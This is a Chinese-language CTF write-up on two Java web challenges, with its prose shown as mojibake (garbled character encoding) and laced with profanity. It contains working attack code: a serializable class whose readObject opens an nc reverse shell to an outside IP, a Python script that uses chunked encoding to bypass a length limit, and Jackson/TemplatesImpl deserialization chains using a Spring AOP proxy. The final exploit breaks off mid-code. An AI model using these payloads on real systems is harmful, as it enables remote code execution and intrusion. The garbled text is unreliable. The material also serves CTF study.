é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡wcsndm,sbä¸œè¥¿,é¢˜ç›®ç¯å¢ƒæ²¡äº†,è¡Œå§,ğŸ‘´æœ¬åœ°æ­ä¸€ä¸ª,nmdå¥—æ¨¡æ¿æ•´äº†ä¸ªdocker-compose,å‘Šè¯‰ğŸ‘´nmdproject name must not be empty,ä½ tmdå€’æ˜¯å‘Šè¯‰ğŸ‘´å“ªé‡Œæ²¡æœ‰project name,é˜¿ç±³è¯ºæ–¯,ä¸€æ ¼å¾·æ‹‰ç±³. åªèƒ½æ‰‹åŠ¨docker build. åŒæ ·æ‹¿åˆ°heapdump ç›´æ¥æ‰“å¼€ 1jvisualvm åˆ«é—®ğŸ‘´å“ªé‡Œè£…,è¿™nmjavaè‡ªå¸¦çš„ è¿›è¡Œä¸€æ³¢OQLæŸ¥è¯¢ 1select s from java.util.LinkedHashMap$Entry s where /spring.security.user.password/.test(s.key) è¿™é‡Œç”¨çš„äº‹æ­£åˆ™æµ‹è¯• &#x2F;rgexp&#x2F;.test()çš„å½¢å¼,è™½ç„¶é‡Œé¢å†…å®¹æ²¡ç”¨åˆ°å•¥æ­£åˆ™,åªæ˜¯èµ°ä¸ªå½¢å¼è€Œå·²,åˆ«é—®ğŸ‘´ä¸ºå•¥ä¸ç›´æ¥æŸ¥value,nmd valueæ˜¯ä¸ªå¯¹è±¡è¿˜æœªçŸ¥,ä½ æŸ¥ä¸ªâˆšâ‘§. tmd &#x2F;loginç™»è¿›å»,è®©ğŸ‘´çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ æºèµ–æ°ä¸€ä¸ªåå°ç®¡ç†ç³»ç»Ÿ,èƒ½ç”¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½çš„åœ°æ–¹. ååºåˆ—åŒ–åˆ†æğŸ˜›1234567@GetMapping(&#123;&quot;/deserialize&quot;&#125;) public void deserialize(@RequestParam(&quot;b64str&quot;) String b64str) throws Exception &#123; byte[] serialized = Base64.getDecoder().decode(b64str); ByteArrayInputStream bis = new ByteArrayInputStream(serialized); SafeObjectInputStream ois = new SafeObjectInputStream(bis); ois.readObject(); &#125; å¾ˆç¾å¥½å¯¹å§,jacksoné“¾ç›´æ¥æ‰“,ä½†æ˜¯ğŸ‘´å‘ç°äº†ä¸å¯¹åŠ²,mdæœ‰æ¯’ è¿˜æ˜¯çœ‹çœ‹è¿œå¤„çš„SafeObjectInputStreamå§ 123456789101112131415161718public SafeObjectInputStream(InputStream is) throws Exception &#123; super(is); &#125; protected Class&lt;?&gt; resolveClass(ObjectStreamClass input) throws IOException, ClassNotFoundException &#123; if (BLACKLIST.contains(input.getName())) &#123; throw new SecurityException(&quot;Hacker!!&quot;); &#125; else &#123; return super.resolveClass(input); &#125; &#125; static &#123; BLACKLIST.add(&quot;com.fasterxml.jackson.databind.node.POJONode&quot;); BLACKLIST.add(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;); BLACKLIST.add(&quot;java.lang.Runtime&quot;); BLACKLIST.add(&quot;java.security.SignedObject&quot;); &#125; éƒ½ç»™ä½ banäº†,rnm,å‡ºé¢˜äººçœŸçš„é˜´é™©,ç°åœ¨ä¸æŠŠjacksoné“¾banäº†,éƒ½ä¸æ•¢ååºåˆ—åŒ–äº†æ˜¯å§ğŸ˜… æ€ä¹ˆç»˜ä¸–å‘¢ æ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤é¢˜ç›®ç»™äº†æ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½,é‚£æ€»ä¸èƒ½ä¸ç”¨å§,è¦ä¸ç„¶é¢˜ç›®æ•´è¿™Î²Ã·ç©æ„å¹²å˜›å‘€.ğŸ˜… æ­£å¥½å‰é¢é€šè¿‡envæ³„éœ²å¾—çŸ¥java_homeçš„ä½ç½® ä»€ä¹ˆ,ä½ ä¸çŸ¥é“java_homeäº‹å¹²å˜›çš„? æ¥,è·ŸğŸ‘´ä¸€èµ·å¿µ: JAVA_HOME æ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºæŒ‡ç¤º Java å¼€å‘å·¥å…·å’Œåº”ç”¨ç¨‹åºåœ¨è®¡ç®—æœºä¸Šçš„å®‰è£…ä½ç½®ã€‚å®ƒä¸»è¦ç”¨äºä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„ä½œç”¨ï¼š Java å¼€å‘å·¥å…·çš„å®šä½ï¼šJAVA_HOME å˜é‡å‘Šè¯‰è®¡ç®—æœºçš„æ“ä½œç³»ç»Ÿå’Œå…¶ä»–å¼€å‘å·¥å…· Java å¼€å‘å·¥å…·çš„å®‰è£…ä½ç½®ã€‚è¿™å¯¹äºç¼–è¯‘ã€è¿è¡Œå’Œè°ƒè¯• Java ç¨‹åºéå¸¸é‡è¦ã€‚ä¾‹å¦‚ï¼Œå½“ä½ ä½¿ç”¨ Java ç¼–è¯‘å™¨ (javac) ç¼–è¯‘ Java ä»£ç æ—¶ï¼Œç³»ç»Ÿéœ€è¦çŸ¥é“ JAVA_HOME çš„ä½ç½®ä»¥æ‰¾åˆ° javac å¯æ‰§è¡Œæ–‡ä»¶ã€‚ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„å®šä½ï¼šé™¤äº†å¼€å‘å·¥å…·ï¼ŒJAVA_HOME ä¹Ÿå¯ä»¥ç”¨äºå®šä½ Java è¿è¡Œæ—¶ç¯å¢ƒï¼ˆJREï¼‰çš„ä½ç½®ã€‚JRE åŒ…å«äº†è¿è¡Œ Java åº”ç”¨ç¨‹åºæ‰€éœ€çš„ç±»åº“å’Œè¿è¡Œæ—¶ç»„ä»¶ã€‚å¦‚æœä½ çš„ç³»ç»Ÿä¸Šæœ‰å¤šä¸ªä¸åŒç‰ˆæœ¬çš„ Java å®‰è£…ï¼Œè®¾ç½® JAVA_HOME å¯ä»¥ç¡®ä¿ä½ ä½¿ç”¨çš„æ˜¯æ­£ç¡®çš„ Java ç‰ˆæœ¬ã€‚ åº”ç”¨ç¨‹åºçš„å®šä½ï¼šæŸäº› Java åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦çŸ¥é“ Java çš„å®‰è£…ä½ç½®ï¼Œä»¥ä¾¿æ­£ç¡®é…ç½®è‡ªå·±ã€‚é€šè¿‡è®¾ç½® JAVA_HOME ç¯å¢ƒå˜é‡ï¼Œè¿™äº›åº”ç”¨ç¨‹åºå¯ä»¥è½»æ¾æ‰¾åˆ°æ‰€éœ€çš„ Java è¿è¡Œæ—¶ç¯å¢ƒã€‚ å¼€å‘å·¥å…·å’Œæ„å»ºå·¥å…·çš„é…ç½®ï¼šè®¸å¤š Java é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰å’Œæ„å»ºå·¥å…·ï¼ˆå¦‚ Maven å’Œ Gradleï¼‰ä½¿ç”¨ JAVA_HOME å˜é‡æ¥é…ç½®å…¶å†…éƒ¨ä½¿ç”¨çš„ Java ç¯å¢ƒã€‚è¿™æœ‰åŠ©äºç¡®ä¿é¡¹ç›®åœ¨æ­£ç¡®çš„ Java ç‰ˆæœ¬ä¸‹ç¼–è¯‘å’Œè¿è¡Œã€‚ è·¨å¹³å°å…¼å®¹æ€§ï¼šé€šè¿‡ä½¿ç”¨ JAVA_HOME å˜é‡ï¼Œå¯ä»¥ä½¿ Java å¼€å‘ç¯å¢ƒåœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Šæ›´å…·å¯ç§»æ¤æ€§ã€‚å®ƒå…è®¸å¼€å‘äººå‘˜ç¼–å†™ä¸€æ¬¡ä»£ç ï¼Œç„¶ååœ¨ä¸åŒå¹³å°ä¸Šä½¿ç”¨ç›¸åŒçš„ JAVA_HOME å˜é‡æ¥è¿è¡Œä»£ç ã€‚ æ€»ä¹‹ï¼ŒJAVA_HOME æ˜¯ä¸€ä¸ªå…³é”®çš„ç¯å¢ƒå˜é‡ï¼Œç”¨äºç¡®ä¿è®¡ç®—æœºä¸Šçš„ Java å¼€å‘å·¥å…·ã€åº”ç”¨ç¨‹åºå’Œè¿è¡Œæ—¶ç¯å¢ƒèƒ½å¤Ÿæ­£ç¡®åœ°æ‰¾åˆ°å’Œä½¿ç”¨ Java å®‰è£…ã€‚å®ƒåœ¨ Java å¼€å‘å’Œéƒ¨ç½²è¿‡ç¨‹ä¸­èµ·åˆ°é‡è¦ä½œç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤šç‰ˆæœ¬ Java å®‰è£…å’Œè·¨å¹³å°å¼€å‘çš„æƒ…å†µä¸‹ã€‚ ä¸è¯´äººè¯å°±æ˜¯è¿™æ ·,è¿™æ˜¯ä¼Ÿå¤§çš„ChatGPTè¯´çš„,ğŸ‘´ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯,è¿è¡Œè„šæœ¬çš„ä½ç½®åœ¨é‚£,è¦è¿è¡Œçš„classä¹Ÿåœ¨é‚£,æ‰€ä»¥æœ‰å•¥classæ”¾é‚£,ä»–å°±èƒ½åŠ è½½å•¥class. æ‰€ä»¥æ¥ä¸‹æ¥è¦å¹²å•¥æ‡‚äº†æ²¡,ä¸Šä¼ ç‚¹å…·æœ‰æ”»å‡»æ€§çš„classåˆ°javahomeé‡Œé¢,ç‹ ç‹ åœ°å…¥å®ƒä¸€æ³¢. è€Œä¸”ä¸æ˜¯æœ‰ååºåˆ—åŒ–å—,åˆ°è¿™ä½ ä¸å¯èƒ½è¿˜ä¸çŸ¥é“å§,åˆ›é€ ä¸€ä¸ªååºåˆ—åŒ–å¸¦æœ‰ç›´æ¥æ¶æ„æ“ä½œçš„ç±»,ç›´æ¥getshellğŸ˜Š 12345678910111213141516171819202122import java.io.*;public class exp implements Serializable &#123; private void readObject(ObjectInputStream in) throws InterruptedException, IOException, ClassNotFoundException &#123; in.defaultReadObject(); Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;nc&quot;,&quot;43.143.192.19&quot;,&quot;1145&quot;,&quot;-e&quot;,&quot;/bin/sh&quot;&#125;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); p.waitFor(); if(p.exitValue()!=0)&#123; &#125; String s = null; while((s=reader.readLine())!=null)&#123; System.out.println(s); &#125; &#125;&#125; å†™ä¸ªexpç±»,ç¼–è¯‘å¥½åå†ä¸Šä¼ ,åˆ«ç›´æ¥sbåˆ°æŠŠjavaä¸Šä¼ äº† ä½†æ˜¯ğŸ‘´ä¸å¤ªé«˜å…´,å› ä¸ºæœ‰ç‚¹bug,ç¬¬ä¸€æ¬¡æ­dockeræ‰“ä¸æˆ,ç¬¬äºŒæ¬¡ç»ˆå‡ºäº†ğŸ˜’. DASCTFXCBCTF_2023_bypassJavaçœŸtmæ¶å¿ƒçš„javaé¢˜,ä¸ä»…æœ‰ç»•è¿‡,è¿˜tmæœ‰RASPè¿™ç§æŠ½è±¡çš„ä¸œè¥¿,ğŸ‘´å¤ªå¼±äº†,ğŸ‘´è¦å­¦. é¢˜ç›®ç¯å¢ƒç”šè‡³ä¸æ˜¯é¶æœº,è€Œæ˜¯é™æ€èµ„æº,å¾ˆä¸çˆ½. è¿˜å¥½å‡ºé¢˜äººå¼€æºäº†:pankass&#x2F;DASCTF_X_CBCTF2023_bypassJava: é¢˜ç›®æºç å’Œdockerç¯å¢ƒ (github.com) Content-Lengthé™åˆ¶ä¸å¤šè¯´,ç¬¬ä¸€æ—¶é—´æƒ³åˆ°jacksoné“¾å­,ä½†æ˜¯æœ‰é•¿åº¦é™åˆ¶ è¿™é•¿åº¦é™åˆ¶æ˜¯äººèƒ½æƒ³å‡ºæ¥çš„å—ğŸ˜“,nmç¨å¾®å¤§ä¸€ç‚¹,éšä¾¿ä¸éƒ½å¾—å‡ åƒ? è¿‡ä¸äº†,æ ¹æœ¬è¿‡ä¸äº†,è®©æˆ‘çœ‹çœ‹bypassæ€ä¹ˆä¸ªäº‹: è¿™é‡Œå¦‚æœå¤´éƒ¨æœ‰transfer-encoding,å°±ä¼šè¿›addInputFilter è¿™é‡Œé¢å¦‚æœæœ‰chunked,é‚£ä¹ˆå°±ä¼šè®¾ç½®æˆthis.contentDelimitationä¸ºtrue æœ€åè¿™é‡Œå°±ä¼šè¿›å…¥if,ä»è€Œè®¾ç½®ContentLengthä¸º-1,ç»•è¿‡é•¿åº¦é™åˆ¶. chunckedç¼–ç æ€ä¹ˆå‘åˆ†å—ç¼–ç ï¼ˆTransfer-Encoding: chunkedï¼‰ - å¦™éŸ³å¤©å¥³ - åšå®¢å›­ (cnblogs.com) ç®€å•çœ‹ä¸€ä¸‹ä»¬å¤§æ¦‚å°±æ˜¯ 123456åå…­è¿›åˆ¶é•¿åº¦/r/n content/r/n .... 0/r/n /r/n æ¯ä¸€å—éƒ½æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºé•¿åº¦ç„¶å,/r/n æ¥ç€è¾“å…¥content,ç„¶å/r/n æœ€åä¸€å—ä¸€å®šè¦è¾“å…¥0/r/n/r/n ğŸ‘´æµ…æµ…å†™ä¸ªè„šæœ¬ 1234567891011121314import requestsurl = &quot;http://127.0.0.1:8080/read&quot;content = open(&quot;data.txt&quot;,&quot;r&quot;).read()leng = hex(len(content)).replace(&quot;0x&quot;,&quot;&quot;)body = leng+&quot;\\r\\n&quot;+content+&quot;\\r\\n0\\r\\n\\r\\n&quot;print(body)headers= &#123;&quot;transfer-encoding&quot;:&quot;chunked&quot;&#125;res = requests.post(url=url,data=body,headers=headers) soeasy,ğŸ¤£, ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥,ğŸ‘´ç°åœºç”šè‡³ç¬¬ä¸€æ­¥éƒ½æ²¡è¿‡å». å†…å­˜é©¬è¯»æ–‡ä»¶ä¸ç¨³å®šjacksoné“¾é—®é¢˜å…³äºjavaååºåˆ—åŒ–ä¸­jacksoné“¾å­ä¸ç¨³å®šé—®é¢˜ (pankas.top) ä»JSON1é“¾ä¸­å­¦ä¹ å¤„ç†JACKSONé“¾çš„ä¸ç¨³å®šæ€§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) ğŸ‘´ctmdæ‰“jacksoné“¾å­çš„æ—¶å€™,æœ‰å²ä»¥æ¥ç¬¬ä¸€æ¬¡é‡è§äº†é™Œç”Ÿçš„æŠ¥é”™ 1com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[&quot;stylesheetDOM&quot;]) ä¸”ç»è¿‡æœ¬åœ°è°ƒè¯•,ä¼¼ä¹è¿›å…¥äº†é™Œç”Ÿçš„ä»£ç æ®µ,ğŸ‘´å¾ˆä¸ä¹æ„. å…·ä½“æ¥è¯´,å°±æ˜¯åœ¨è°ƒç”¨gettersçš„æ—¶å€™,ä¼˜å…ˆå¥äº†getStylesheetDOMè¿™ä¸ªæ–¹æ³•,ä½†æ˜¯,ä¼—æ‰€å‘¨çŸ¥,æˆ‘ä»¬åœ¨åºåˆ—åŒ–çš„æ—¶å€™,æ˜¯ä¸ä¼šå»è®¾ç½®è¿™ä¸ªå€¼çš„,æ‰€ä»¥ç†æ‰€åº”å½“çš„,nmdç©ºæŒ‡é’ˆäº†.ğŸ˜“ğŸ˜…è€Œå½“å…¶è°ƒç”¨ getter æ–¹æ³•æ—¶ä¼˜å…ˆè°ƒç”¨ getOutputProperties æ–¹æ³•æ—¶æ‰æ˜¯æˆ‘ä»¬æ­£å¸¸æƒ³è¦çš„ç»“æœã€‚ è¿™nmçœŸæœ‰å‘å•Š,æ¯”èµ›æƒ³æ‰“è¿™æ¡é“¾å­,ä¸è¯´banä½é—®é¢˜,nmdè¿™é—®é¢˜ä¹Ÿåªèƒ½é€šè¿‡ä¸åœåœ°é‡ç½®é¶æœºè§£å†³äº†,æ¯”èµ›ä½ é‡ç½®é¶æœº,é™æ€åœ°å€ç­‰ä¼¼å§. ç°åœ¨ğŸ‘´æ¥åˆ†æä¸€ä¸‹æ€ä¹ˆä¸ªäº‹,ä¼˜åŒ–ä¸€ä¸‹ æµç¨‹è¿™æ¡é“¾å­åˆ†æğŸ‘´ä¸æƒ³è¯´äº†,é—­ç€çœ¼ç›éƒ½çŸ¥é“æ€ä¹ˆä¸ªäº‹. å…³é”®æ˜¯è§¦å‘POJONodeçš„toStringæ–¹æ³•,ç„¶åå†…éƒ¨ç»è¿‡ä¸€ç³»åˆ—åºåˆ—åŒ–å™¨è°ƒç”¨ POJONode ä¸­å°çš„ _value å±æ€§çš„ getter æ–¹æ³•ï¼Œä»è€Œè°ƒç”¨ TemplatesImplç±»å‹å¯¹è±¡çš„ getOutputProperties æ–¹æ³•ä»è€Œå¯¼è‡´æ‰§è¡Œä»»æ„ä»£ç ã€‚ é‡ç‚¹å°±æ˜¯ä»toStringåˆ°gettersçš„è°ƒç”¨è¿™ä¸€è¿‡ç¨‹ æ ˆè°ƒè¯•æ”¾åœ¨è¿™: 1234567891011121314151617181920getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)serializeAsField:689, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)serializeFields:774, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)serialize:178, BeanSerializer (com.fasterxml.jackson.databind.ser)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) åœ¨ com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField æ–¹æ³•ä¸­åˆ©ç”¨åå°„æ¥æ‰§è¡Œå…¶ getters æ–¹æ³• è¿™æ¬¡å°±è°ƒç”¨äº†getoutputProperties,å¾ˆå¥½,ğŸ‘´å–œæ¬¢ğŸ¤ª é‚£å°±å¾€å‰çœ‹çœ‹å“ªé‡Œè·å–äº†getters åœ¨com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFieldsä¸­,propæ•°ç»„å­˜å‚¨äº†getters,é€šè¿‡å¾ªç¯éå†æ‰€æœ‰getterså¹¶è°ƒç”¨serializeAsField è¿½è¸ªä¸€ä¸‹è¿™ä¸ªå˜é‡,ä» _propsè·å¾— æœ€ç»ˆåœ¨com.fasterxml.jackson.databind.introspectèµ‹å€¼ 12345678910111213141516171819202122collectAll:418, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)getJsonValueAccessor:270, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)findJsonValueAccessor:258, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)findSerializerByAnnotations:391, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)_createSerializer2:224, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)createSerializer:173, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)_createUntypedSerializer:1495, SerializerProvider (com.fasterxml.jackson.databind)_createAndCacheUntypedSerializer:1443, SerializerProvider (com.fasterxml.jackson.databind)findValueSerializer:544, SerializerProvider (com.fasterxml.jackson.databind)findTypedValueSerializer:822, SerializerProvider (com.fasterxml.jackson.databind)defaultSerializeValue:1142, SerializerProvider (com.fasterxml.jackson.databind)serialize:115, POJONode (com.fasterxml.jackson.databind.node)serialize:39, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)serialize:20, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)_serialize:480, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serializeValue:319, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)serialize:1518, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)_writeValueAndClose:1219, ObjectWriter (com.fasterxml.jackson.databind)writeValueAsString:1086, ObjectWriter (com.fasterxml.jackson.databind)nodeToString:30, InternalNodeMapper (com.fasterxml.jackson.databind.node)toString:136, BaseJsonNode (com.fasterxml.jackson.databind.node) è¿™é‡Œå°±æ˜¯ç¬¬ä¸€æ¬¡å†³å®šgettersé¡ºåº éšåé€šè¿‡getDeclaredMethods è·å–æ–¹æ³•ï¼Œé‚£è¿™é‡Œè·å–æ–¹æ³•çš„é¡ºåºæ˜¯ä¸å›ºå®šçš„ã€‚ å¹¶ä¸”ï¼Œåœ¨com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializeræ–¹æ³•é‡Œï¼Œä¼šå°†è·å–çš„æ–¹æ³•é¡ºåºè¿›è¡Œç¼“å­˜ï¼Œä¹‹å‰æåˆ°è¿‡äº†ï¼Œç¼“å­˜åä¼šè¿›å…¥å…¶å®ƒifã€‚ å› æ­¤ç¬¬ä¸€æ¬¡æ‰“ä¸é€šï¼Œä¹‹åä¹Ÿæ— æ³•æ‰“é€šäº† ä¸ºä»€ä¹ˆé¡ºåºä¸ä¸€å®šè·å–é¡ºåºæ˜¯æ ¹æ®åœ°å€çš„å¤§å°æ¥æ’åºçš„ï¼ŒæœŸé—´å­˜åœ¨å†…å­˜freeçš„åŠ¨ä½œï¼Œé‚£åœ°å€æ˜¯ä¸ä¼šä¸€ç›´çº¿æ€§å˜åŒ–çš„ï¼Œä¹‹æ‰€ä»¥ä¸æŒ‰ç…§å­—æ¯æ’åºï¼Œä¸»è¦è¿˜æ˜¯ä¸ºäº†é€Ÿåº¦è€ƒè™‘ï¼Œæ ¹æ®åœ°å€æ’åºæ˜¯æœ€å¿«çš„ã€‚ æ˜¯åå°„ getDeclaredMethods è·å–åˆ°æ–¹æ³•çš„é¡ºåºæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ€ç»ˆå¯¼è‡´æ‰§è¡Œç›¸å…³getteræ–¹æ³•çš„é¡ºåºä¹Ÿæ˜¯ä¸ç¡®å®šçš„ï¼Œå½“ TemplatesImpl çš„ getStylesheetDOM æ–¹æ³•å…ˆäº getOutputProperties æ–¹æ³•æ‰§è¡Œæ—¶å°±ä¼šå¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸ä»è€Œå¯¼è‡´è°ƒç”¨é“¾æŠ¥é”™ä¸­æ–­ï¼Œexpåˆ©ç”¨å¤±è´¥ã€‚ è§£å†³æ–¹æ³•ğŸ˜Šorg.springframework.aop.framework.JdkDynamicAopProxyè§£å†³é—®é¢˜ å®ç°ä¼—æ‰€å‘¨çŸ¥,javaæœ‰ä¸ªbç©æ„å«åšåŠ¨æ€ä»£ç†,å¾ˆnb,ğŸ‘´åªåœ¨ccä¸­ç”¨è¿‡,ä¸æ¸…æ¥š. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;TestInterface1.class, TestInterface2.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; è¿™æ˜¯æ‰§è¡Œç»“æœ,å¯ä»¥çœ‹æ‡‚èƒ½è·å–åˆ°çš„æ–¹æ³•,å®Œå…¨å–å†³äºæ¥å£å®ç°äº†å“ªäº›æ–¹æ³• è€Œ javax.xml.transform.Templates æ¥å£å…¶åªæœ‰ newTransformer å’Œ getOutputProperties è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•ï¼Œè®©ä»–ä½œä¸ºæˆ‘ä»¬ä»£ç†æ‰€éœ€çš„æ¥å£ï¼Œè¿™æ ·æœ€ç»ˆé€šè¿‡ getDeclaredMethods è·å–åˆ°çš„æ–¹æ³•å°±åªæœ‰ newTransformer å’Œ getOutputProperties äº†ï¼Œé‚£ä¹ˆæœ€ç»ˆè·å¾—çš„getteræ–¹æ³•ä¾¿åªæœ‰ getOutputProperties äº†ã€‚ å› æ­¤åªéœ€è¦æŒ‚ä»£ç†,å°±åªä¼šè·å–æ¥å£æ–¹æ³• 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package org.example;import javax.xml.transform.Templates;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class Test &#123; public static void main(String[] args) &#123; Object myProxy = Proxy.newProxyInstance(TestProxy.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, new MyHandler()); for(Method m: myProxy.getClass().getDeclaredMethods()) &#123; System.out.println(m.getName()); &#125; &#125;&#125;interface TestInterface1 &#123; public void say();&#125;interface TestInterface2 &#123; public void test();&#125;class TestProxy &#123; public void eat() &#123; System.out.println(&quot;eat something&quot;); &#125; public void say() &#123; System.out.println(&quot;say something&quot;); &#125; public String getName(String a) &#123; return a; &#125;&#125;class MyHandler implements InvocationHandler &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;invoke dynamic proxy handler&quot;); return null; &#125;&#125; è¿™ä¸¤ä¸ªæ–¹æ³•æ˜¯Templatesé‡Œé¢å®šä¹‰çš„æ¥å£æ–¹æ³• JdkDynamicAopProxy æ˜¯ Spring æ¡†æ¶ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°äº† JDK åŠ¨æ€ä»£ç†æœºåˆ¶ï¼Œç”¨äºåˆ›å»ºä»£ç†å¯¹è±¡æ¥å®ç°é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼ˆAOPï¼‰çš„åŠŸèƒ½ã€‚ è¿™é‡Œèƒ½å¤Ÿæ§åˆ¶advised è¿™é‡Œä¼šè§¦å‘åå°„æ–¹æ³•,è¿™é‡Œadvisedå‰é¢è¯´è¿‡äº†å¯æ§ æˆ‘ä»¬å°†æ‰€éœ€çš„ TemplatesImpl çš„å¯¹è±¡ç”¨ org.springframework.aop.framework.AdvisedSupport å°è£…å³å¯ 1234Object oldProxy = null; boolean setProxyContext = false; TargetSource targetSource = this.advised.targetSource; Object target = null; æ„é€ 12345678Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);cons.setAccessible(true);AdvisedSupport advisedSupport = new AdvisedSupport();advisedSupport.setTarget(templatesImpl);InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]&#123;Templates.class&#125;, handler);POJONode jsonNodes = new POJONode(proxyObj); ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.fasterxml.jackson.databind.node.BaseJsonNode;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Base64;public class exp &#123; public static void main(String[] args)throws Exception&#123;// ClassPool classPool = ClassPool.getDefault();// CtClass ctClass = classPool.get(evilref.class.getName());// CtClass superClass = classPool.get(AbstractTranslet.class.getName());// ctClass.setSuperclass(superClass);//// CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);//// constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;calc\\&quot;);&quot;);//// ctClass.addConstructor(constructor); //byte[][] codes = new byte[][]&#123;code&#125;; TemplatesImpl templates = new TemplatesImpl(); ref(templates, &quot;_bytecodes&quot;, new byte[][]&#123;&#125;); ref(templates, &quot;_name&quot;, &quot;shanghe&quot;); ref(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); POJONode jsonNodes = new POJONode(templates); BadAttributeValueExpException exp = new BadAttributeValueExpException(null); Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;); val.setAccessible(true); val.set(exp,jsonNodes); serialize_func.serialize(exp); WriteToFileExample(serialize_func.encryptToBase64(&quot;ser.bin&quot;)); &#125; public static void WriteToFileExample(String args) &#123; String content = &quot;è¿™æ˜¯è¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²å†…å®¹&quot;; try &#123; BufferedWriter writer = new 